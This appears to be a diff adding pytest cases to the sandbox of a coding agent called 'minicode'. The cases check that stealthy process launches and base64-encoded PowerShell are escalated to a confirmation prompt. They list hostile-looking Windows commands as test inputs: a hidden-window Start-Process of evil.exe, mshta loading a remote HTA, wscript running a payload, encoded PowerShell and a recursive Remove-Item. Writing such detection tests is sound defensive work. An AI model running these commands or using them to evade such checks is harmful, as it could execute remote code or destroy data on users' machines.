@@ -6,9 +6,11 @@ import pytest
 from minicode.config import Config
 from minicode.permission import ALLOW, ASK, REJECT, PermissionGate
 from minicode.sandbox import (
-    ALLOW as SB_ALLOW, BLOCKED, INSIDE, OUTSIDE, REJECT as SB_REJECT,
+    ALLOW as SB_ALLOW, ASK as SB_ASK, BLOCKED, INSIDE, OUTSIDE,
+    REJECT as SB_REJECT,
     SandboxPolicy, SandboxState, check_command, classify_for_write,
-    classify_path, command_hits_network, command_touches_outside_path,
+    classify_path, command_hits_network, command_hits_stealth,
+    command_touches_outside_path,
     is_git_internal, policy_from_raw, policy_to_raw, scan_script_text,
     script_hits, sensitive_roots,
 )
@@ -103,6 +105,66 @@ def test_check_command_deny_patterns_and_network():
     # 沙箱关闭时不拦网络
     assert check_command(SandboxPolicy(enabled=False, allow_network=False),
                          "curl https://x")[0] == SB_ALLOW
+
+
+# ------------------------------------------------ "两层都扫不到"那一类(v0.9.129)
+# 命令层只看命令行,脚本内容层只读得到落成文件的那份脚本。这一类补的是从两层之间
+# 漏过去的两种写法:**起一个不等它的进程**、**把 base64 交给解释器**。
+# 只 ASK 不 REJECT —— 隐藏窗口跑个东西可能是正当需求,而这一层不是防火墙。
+
+STEALTH_ON = SandboxPolicy(enabled=True)
+
+
+@pytest.mark.parametrize("cmd", [
+    'powershell -Command "Start-Process evil.exe -WindowStyle Hidden"',
+    "Start-Process -FilePath node -ArgumentList server.js",
+    "Start-Job -ScriptBlock { Remove-Item -Recurse }",
+    'cmd /c start "" notepad.exe',
+    "start /b watch.bat",
+    "wscript payload.vbs",
+    "mshta http://x/a.hta",
+    "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQAgAFgAeAA=",
+])
+def test_stealth_launches_upgrade_to_ask(cmd):
+    level, why = check_command(STEALTH_ON, cmd)
+    assert level == SB_ASK, cmd
+    assert why, "ASK 必须带一句具体原因,不能只说「沙箱觉得要问」"
+
+
+@pytest.mark.parametrize("cmd", [
+    "npm start",                      # 最高频的误伤候选:段的第二个词才是 start
+    "yarn dev && npm run start",
+    "docker start mydb",
+    'git commit -m "start the rewrite"',
+    "python -c \"print(sum(range(10)))\"",   # 刻意不收:见函数上的注释
+    "powershell -ExecutionPolicy Bypass -File build.ps1",  # 没有长 base64 那一段
+    "python a.py",
+    "ls -la",
+])
+def test_stealth_scan_does_not_nag_ordinary_commands(cmd):
+    assert check_command(STEALTH_ON, cmd)[0] == SB_ALLOW, cmd
+
+
+def test_stealth_is_silent_when_the_sandbox_is_off():
+    """整条命令层是沙箱的一部分:关掉沙箱就不该由这一类开口(与网络那条同一立场)。"""
+    assert check_command(SandboxPolicy(enabled=False),
+                         'cmd /c start "" notepad.exe')[0] == SB_ALLOW
+
+
+def test_stealth_reason_names_what_we_cannot_see():
+    """回话要指名"看不见的是什么",否则用户看到的只是一句吓人的"违规"。"""
+    _level, why = check_command(STEALTH_ON, "Start-Process evil.exe")
+    assert "不等它结束" in why and ("超时" in why or "输出" in why)
+    _level, why2 = check_command(STEALTH_ON,
+                                 "powershell -enc " + "QQBFAFgA" * 4 + "AA==")
+    assert "base64" in why2
+
+
+def test_stealth_helper_returns_none_for_clean_commands():
+    """直接问那只探针:门在不在都靠它,它自己坏掉时上面那批断言会一起变空转。"""
+    assert command_hits_stealth("npm start") is None
+    assert command_hits_stealth("") is None
+    assert "不等它结束" in command_hits_stealth("wscript a.vbs")
 
 
 def test_command_hits_network_variants():
